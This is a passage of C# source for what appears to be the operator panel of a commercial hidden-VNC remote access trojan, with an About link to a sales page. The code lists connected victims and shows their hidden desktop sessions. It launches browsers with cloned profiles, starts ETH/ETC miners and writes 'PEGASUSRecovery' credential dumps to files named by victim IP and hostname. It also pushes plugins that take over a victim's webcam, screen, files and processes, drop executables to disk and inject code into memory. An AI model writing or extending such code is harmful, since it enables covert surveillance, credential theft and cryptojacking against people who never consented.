                    int num5 = 0;
                    byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];

                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        int num6 = 0;
                        int num7 = array2.Length;

                        while (num7 > 0)
                        {
                            num5 = tcpClient.GetStream().Read(array2, num6, num7);
                            num7 -= num5;
                            num6 += num5;
                        }

                        memoryStream.Write(array2, 0, (int)num4);
                        memoryStream.Position = 0L;

                        object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));

                        if (objectValue is string)
                        {
                            string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
                            try
                            {
                                if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
                                {
                                    string ipp;

                                    try
                                    {
                                        //ipp = array3[7];
                                        ipp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();

                                    }
                                    catch
                                    {
                                        ipp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }

                                    ListViewItem lvi = new ListViewItem(new string[]
                                    {
                    " " + array3[1].Replace(" ", null) + RandomNumber(5), ipp, array3[2], array3[3], array3[4], array3[5], array3[6]
                                    })
                                    { Tag = tcpClient, ImageKey = (array3[3].ToString() + ".png") };

                                    HVNCList.Invoke((MethodInvoker)delegate
                                    {
                                        lock (_clientList)
                                        {
                                            HVNCList.Items.Add(lvi);
                                            HVNCList.Items[int_2].Selected = true;
                                            _clientList.Add(tcpClient);
                                            int_2++;
                                            label13.Text = "Status : Connections: " + Conversions.ToString(int_2);
                                        }
                                    });


                                }

                                else if (_clientList.Contains(tcpClient))
                                {
                                    GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                                }
                                else
                                {
                                    tcpClient.Close();
                                }
                            }
                            catch (Exception ex)
                            {
                                //MessageBox.Show(ex.Message);
                            }
                        }
                        else if (_clientList.Contains(tcpClient))
                        {
                            GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                        }
                        else
                        {
                            tcpClient.Close();
                        }
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }

                    tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);

                    if (!ex.Message.Contains("disposed"))
                    {
                        try
                        {
                            if (_clientList.Contains(tcpClient))
                            {
                                int NumberReceived;
                                int num8 = (NumberReceived = Application.OpenForms.Count - 2);
                                while (NumberReceived >= 0)
                                {
                                    if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
                                    {
                                        if (Application.OpenForms[NumberReceived].Visible)
                                        {
                                            Invoke((MethodInvoker)delegate
                                            {

                                                if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                                {
                                                    Application.OpenForms[NumberReceived].Close();
                                                }
                                            });
                                        }
                                        else if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                        {
                                            Application.OpenForms[NumberReceived].Close();
                                        }
                                    }
                                    NumberReceived += -1;
                                }
                                lock (_clientList)
                                {
                                    try
                                    {
                                        int index = _clientList.IndexOf(tcpClient);
                                        _clientList.RemoveAt(index);
                                        HVNCList.Items.RemoveAt(index);
                                        tcpClient.Close();
                                        int_2--;
                                        label13.Text = "Status : Connections: " + Conversions.ToString(int_2);
                                    }
                                    catch (Exception ex1)
                                    {
                                        //MessageBox.Show(ex1.Message);
                                    }
                                }
                            }
                        }
                        catch (Exception ex2)
                        {
                            //MessageBox.Show(ex2.Message);
                        }
                    }
                    else
                    {
                        tcpClient.Close();
                    }
                }
            }
        }

        /// <summary>
        /// The GetStatus.
        /// </summary>
        /// <param name="object_2">The object_2<see cref="object"/>.</param>
        /// <param name="tcpClient_0">The tcpClient_0<see cref="TcpClient"/>.</param>
        public void GetStatus(object object_2, TcpClient tcpClient_0)
        {

            int hashCode = tcpClient_0.GetHashCode();
            FrmVNC vNCForm = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
            if (object_2 is Bitmap)
            {
                vNCForm.VNCBoxe.Image = (Image)object_2;
            }
            else
            {
                if (!(object_2 is string))
                {
                    return;
                }
                string[] dataReceive = Conversions.ToString(object_2).Split('|');
                string left = dataReceive[0];


                if (Operators.CompareString(left, "0", TextCompare: false) == 0)
                {
                    vNCForm.VNCBoxe.Tag = new Size(Conversions.ToInteger(dataReceive[1]), Conversions.ToInteger(dataReceive[2]));
                }


                if (Operators.CompareString(left, "9", TextCompare: false) != 0)
                {
                    Invoke((MethodInvoker)delegate
                    {

                        try
                        {
                            Clipboard.SetText(dataReceive[1]);
                        }
                        catch (Exception ex)
                        {
                            //MessageBox.Show(ex.Message);
                        }
                    });
                }
                if (Operators.CompareString(left, "991", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "360 Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "881", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "360 Browser started successfully !";
                }
                if (Operators.CompareString(left, "992", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Atom Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "882", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Atom Browser started successfully !";
                }
                if (Operators.CompareString(left, "993", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Awast Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "883", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Awast Browser started successfully !";
                }
                if (Operators.CompareString(left, "994", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chromodo Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "884", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chromodo Browser started successfully !";
                }
                if (Operators.CompareString(left, "995", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "CocCoc Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "885", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "CocCoc Browser started successfully !";
                }
                if (Operators.CompareString(left, "996", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Comodo Dragon Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "886", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Comodo Dragon Browser started successfully!";
                }
                if (Operators.CompareString(left, "997", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Epic Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "887", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Epic Browser started successfully !";
                }
                if (Operators.CompareString(left, "998", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Opera Neon Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "888", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Opera Neon Browser started successfully!";
                }
                if (Operators.CompareString(left, "999", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Orbitum Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "889", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Orbitum Browser started successfully!";
                }
                if (Operators.CompareString(left, "1000", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Palemoon Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2000", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Palemoon Browser started successfully!";
                }
                if (Operators.CompareString(left, "1001", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Slimjet Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2001", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Slimjet Browser started successfully!";
                }
                if (Operators.CompareString(left, "1002", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Sputnik Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2002", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Sputnik Browser started successfully!";
                }
                if (Operators.CompareString(left, "1003", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "UC Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2003", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "UC Browser started successfully!";
                }
                if (Operators.CompareString(left, "1004", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Vivaldi Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2004", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Vivaldi Browser started successfully!";
                }
                if (Operators.CompareString(left, "1005", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "WaterFox Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2005", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "WaterFox Browser started successfully!";
                }
                if (Operators.CompareString(left, "1006", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Yandex Browser successfully started with clone profile !";
                }
                if (Operators.CompareString(left, "2006", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Yandex Browser started successfully!";
                }

                if (Operators.CompareString(left, "200", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started with clone profile !";
                }

                if (Operators.CompareString(left, "201", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started !";
                }

                if (Operators.CompareString(left, "202", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started with clone profile !";
                }

                if (Operators.CompareString(left, "203", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started !";
                }

                if (Operators.CompareString(left, "204", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started with clone profile !";
                }

                if (Operators.CompareString(left, "205", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started !";
                }

                if (Operators.CompareString(left, "206", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started with clone profile !";
                }

                if (Operators.CompareString(left, "207", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
                }

                if (Operators.CompareString(left, "256", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
                }

                if (Operators.CompareString(left, "222", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "ETH miner successfully started !";
                }

                if (Operators.CompareString(left, "223", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "ETC miner successfully started !";
                }

                if (Operators.CompareString(left, "22", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.int_0 = Conversions.ToInteger(dataReceive[1]);
                    vNCForm.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(dataReceive[1]);
                }


                if (Operators.CompareString(left, "23", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(dataReceive[1]));
                }


                if (Operators.CompareString(left, "24", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = "Clone successfully !";
                }


                if (Operators.CompareString(left, "25", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
                }

                if (Operators.CompareString(left, "26", TextCompare: false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
                }

                if (Operators.CompareString(left, "2555", false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
                }

                if (Operators.CompareString(left, "2556", false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
                }

                if (Operators.CompareString(left, "2557", false) == 0)
                {
                    vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
                }

                if (Operators.CompareString(left, "3307", false) == 0)
                {
                    Clipboard.SetText(dataReceive[1].ToString());
                }

                if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PEGASUSRecovery"))
                {
                    Directory.CreateDirectory("PEGASUSRecovery");
                    PEGALISIUS.PEGASUSRecoveryResults = dataReceive[1].ToString();
                }

                if (!PEGALISIUS.PEGASUSRecoveryResults.Contains("System"))
                {
                    System.IO.File.WriteAllText(
                        Directory.GetCurrentDirectory() + "\\PEGASUSRecovery\\" + this.xxip + "_" + this.xxhostname +
                        "_PEGASUSRecovery.txt", PEGALISIUS.PEGASUSRecoveryResults);
                }


            }
        }

        /// <summary>
        /// The HVNCList_DoubleClick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void HVNCList_DoubleClick(object sender, EventArgs e)
        {
            if (HVNCList.FocusedItem.Index == -1)
            {
                return;
            }
            checked
            {
                int num = Application.OpenForms.Count - 1;
                while (true)
                {
                    if (num >= 0)
                    {
                        if (Application.OpenForms[num].Tag == _clientList[HVNCList.FocusedItem.Index])
                        {
                            break;
                        }
                        num += -1;
                        continue;
                    }

                    FrmVNC vNCForm = new FrmVNC();
                    vNCForm.Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode());
                    vNCForm.Tag = _clientList[HVNCList.FocusedItem.Index];
                    string name = HVNCList.FocusedItem.SubItems[2].ToString();
                    name = name.Replace("ListViewSubItem", "Status : Connected to:");
                    vNCForm.Text = name;
                    vNCForm.Show();
                    return;
                }
                Application.OpenForms[num].Show();
            }
        }

        /// <summary>
        /// The HVNCList_DrawColumnHeader.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="DrawListViewColumnHeaderEventArgs"/>.</param>
        private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            e.DrawDefault = true;
        }

        /// <summary>
        /// The HVNCList_DrawItem.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="DrawListViewItemEventArgs"/>.</param>
        private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            if (!e.Item.Selected)
            {
                e.DrawDefault = true;
            }
        }

        /// <summary>
        /// The HVNCList_DrawSubItem.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="DrawListViewSubItemEventArgs"/>.</param>
        private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
                TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
            }
            else
            {
                e.DrawDefault = true;
            }
        }

        /// <summary>
        /// The ReadSettings.
        /// </summary>
        /// <returns>The <see cref="bool"/>.</returns>
        public bool ReadSettings()
        {
            try
            {
                string filePath = (Path.GetDirectoryName(Application.ExecutablePath) + "\\HVNC 3.0.0.2.conf");
                List<string> lines = File.ReadLines(filePath).ToList();

                string p = lines[4].Replace("port=", null);
                btnStarthvnc.Text = p;

                if (lines[3].ToString().Contains("enabled"))
                {
                    //listenning1.SelectedIndex = 1;
                    //listenning1.Text = "Enabled";
                    // btnStarthvnc.PerformClick();
                }
                else
                {
                    // listenning1.Text = "Disabled";
                }


                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// The ping_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ping_Tick(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (var client in GetAllClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                GC.Collect();
            }
        }

        /// <summary>
        /// Defines the userName.
        /// </summary>
        public static string userName = WindowsIdentity.GetCurrent().Name;

        /// <summary>
        /// The UpdateUI_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
            lock (Settings.LockListviewClients)
            {
                toolStripStatusLabel1.Text =
                    $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}            Upload {Methods.BytesToString(Settings.SentValue)}     Download  {Methods.BytesToString(Settings.ReceivedValue)}                    CPU Usage: {(int)performanceCounter1.NextValue()}%     Memory Usage: {(int)performanceCounter2.NextValue()}%";
            }
        }

        /// <summary>
        /// The STARTToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "thumbnails";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetAllClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
        }

        /// <summary>
        /// The STOPToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";

                    foreach (ListViewItem itm in listView3.Items)
                    {
                        var client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                    }
                }

                listView3.Items.Clear();
                ThumbnailImageList.Images.Clear();
                foreach (ListViewItem itm in listView1.Items)
                {
                    var client = (Clients)itm.Tag;
                    client.LV2 = null;
                }
            }
            catch
            {
            }
        }

        /// <summary>
        /// The SetWindowTheme.
        /// </summary>
        /// <param name="hWnd">The hWnd<see cref="IntPtr"/>.</param>
        /// <param name="textSubAppName">The textSubAppName<see cref="string"/>.</param>
        /// <param name="textSubIdList">The textSubIdList<see cref="string"/>.</param>
        /// <returns>The <see cref="int"/>.</returns>
        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
        public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

        /// <summary>
        /// The aboutToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            /*
            using (var formAbout = new FormAbout())
            {
                formAbout.ShowDialog();
            }
            
            */
            Process.Start("https://skynetcorp.sellix.io/ ");
        }

        /// <summary>
        /// The RemoteShellToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The RemoteScreenToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\RD.dll");
                foreach (var client in GetSelectedClients())
                {
                    var remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
                    if (remoteDesktop == null)
                    {
                        remoteDesktop = new FormRemoteDesktop
                        {
                            Name = "RemoteDesktop:" + client.ID,
                            F = this,
                            Text = "RemoteDesktop:" + client.ID,
                            ParentClient = client,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID,
                                "RemoteDesktop")
                        };
                        remoteDesktop.Show();
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The RemoteCameraToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\RC.dll");

                    foreach (var client in GetSelectedClients())
                    {
                        var remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
                        if (remoteDesktop == null)
                        {
                            remoteDesktop = new FormWebcam
                            {
                                Name = "Webcam:" + client.ID,
                                F = this,
                                Text = "Webcam:" + client.ID,
                                ParentClient = client,
                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
                            };
                            remoteDesktop.Show();
                            client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The FileManagerToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\FM.dll");

                foreach (var client in GetSelectedClients())
                {
                    var fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                    if (fileManager == null)
                    {
                        fileManager = new FormFileManager
                        {
                            Name = "fileManager:" + client.ID,
                            Text = "fileManager:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
                        };
                        fileManager.Show();
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The ProcessManagerToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\PM.dll");

                foreach (var client in GetSelectedClients())
                {
                    var processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                    if (processManager == null)
                    {
                        processManager = new FormProcessManager
                        {
                            Name = "processManager:" + client.ID,
                            Text = "processManager:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        processManager.Show();
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The SendFileToDiskToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "exe files (*.exe)|*.exe|All files (*.*)|*.*";
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (var file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The SendFileToMemoryToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.IsOK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                    packet.ForcePathObject("File")
                        .SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));
                    if (formSend.comboBox1.SelectedIndex == 0)
                        packet.ForcePathObject("Inject").AsString = "";
                    else
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SM.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }

                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The MessageBoxToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var Msgbox = InputDialog.Show("Message");
                if (string.IsNullOrEmpty(Msgbox)) return;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "sendMessage";
                packet.ForcePathObject("Message").AsString = Msgbox;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The ChatToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (var client in GetSelectedClients())
                {
                    var chat = (FormChat)Application.OpenForms["chat:" + client.ID];
                    if (chat == null)
                    {
                        chat = new FormChat
                        {
                            Name = "chat:" + client.ID,
